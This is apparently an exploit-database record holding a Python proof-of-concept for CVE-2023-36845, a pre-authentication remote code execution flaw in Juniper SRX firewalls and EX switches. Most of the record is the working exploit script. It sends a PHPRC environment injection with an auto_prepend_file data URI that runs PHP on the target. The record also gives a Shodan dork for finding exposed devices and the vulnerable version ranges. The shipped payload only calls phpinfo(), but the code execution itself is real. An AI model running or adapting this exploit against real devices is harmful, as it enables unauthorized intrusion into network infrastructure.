[
  {
    "source": "## https://sploitus.com/exploit?id=EDB-ID:51776\n# ***************************************************************************************************\r\n# Exploit Title: juniper-SRX-Firewalls&EX-switches (PreAuth-RCE) (PoC)\r\n# Description:\r\n#\r\n# This code serves as both a vulnerability detector and a proof of concept for CVE-2023-36845.\r\n# It executes the phpinfo() function on the login page of the target device, \r\n# allowing to inspect the PHP configuration. also this script has the option to save the phpinfo() \r\n# output to a file for further analysis.\r\n#\r\n# Shodan Dork: http.favicon.hash:2141724739\r\n# Date: 2023/10/01\r\n# Exploit Author: whiteOwl (whiteowl.pub@gmail.com)\r\n# Vendor Homepage: https://whiteowl-pub.github.io\r\n# Version: Versions Prior to 20.4R3-S9,21.1R1,21.2R3-S7,21.3R3-S5,\r\n#          21.4R3-S5,22.1R3-S4,22.2R3-S2,22.3R2-S2/R3-S1,22.\r\n#          4R2-S1/R3,23.2R1-S1/R2\r\n# Tested on: JUNOS SM804122pri 15.1X49-D170.4\r\n# CVE : cve-2023-36845\r\n# ***************************************************************************************************\r\n\r\nimport argparse\r\nimport requests\r\n\r\nbanner = \"\"\"\r\n*************************************************************\r\n* CVE-2023-36845 Vulnerability Detector & Proof of concept  *\r\n* This script checks for the CVE-2023-36845 vulnerability   *\r\n* and run phpinfo() on vulnerable devices.                  *\r\n* If you suspect a vulnerable system, please take action    *\r\n* immediately to secure it.                                 *\r\n*                                                           *\r\n* Author: whiteowl                                          *\r\n*************************************************************\r\n\"\"\"\r\n\r\ndef send_request(url, output_file=None, verbose=False):\r\n    target_url = f\"{url}/?PHPRC=/dev/fd/0\"\r\n    data = 'allow_url_include=1\\nauto_prepend_file=\"data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg==\"'\r\n\r\n    headers = {\r\n        'User-Agent': 'Mozilla/5.0',\r\n    }\r\n\r\n    try:\r\n        response = requests.post(target_url, headers=headers, data=data, stream=True)\r\n        if response.status_code == 200:\r\n            print(\"The Target Device is Vulnerable to: CVE-2023-36845\")\r\n        else:\r\n            print(\"Not Vulnerable: Status Code\", response.status_code)\r\n            \r\n        if output_file:\r\n            with open(output_file, 'w', encoding='utf-8') as file:\r\n                file.write(response.text)\r\n\r\n        if verbose:\r\n            print(f\"HTTP Status Code: {response.status_code}\")\r\n            print(\"Response Headers:\")\r\n            for header, value in response.headers.items():\r\n                print(f\"{header}: {value}\")\r\n            print(\"Response Content:\")\r\n            print(response.text)\r\n    except requests.exceptions.RequestException as e:\r\n        print(f\"An error occurred: {e}\")\r\n\r\ndef main():\r\n    print(banner) \r\n    parser = argparse.ArgumentParser(description=\"Custom curl-like script\")\r\n    parser.add_argument(\"-u\", \"--url\", required=True, help=\"URL to send the HTTP request\")\r\n    parser.add_argument(\"-o\", \"--output\", help=\"Output file to save the HTML content\")\r\n    parser.add_argument(\"-v\", \"--verbose\", action=\"store_true\", help=\"Enable verbose mode\")\r\n\r\n    args = parser.parse_args()\r\n    send_request(args.url, args.output, args.verbose)\r\n\r\nif __name__ == \"__main__\":\r\n    main()",
    "id": "EDB-ID:51776",
    "href": "https://www.exploit-db.com/raw/51776",
    "title": "Exploit for Juniper-SRX-Firewalls&EX-switches - (PreAuth-RCE) (PoC)"
  }
]
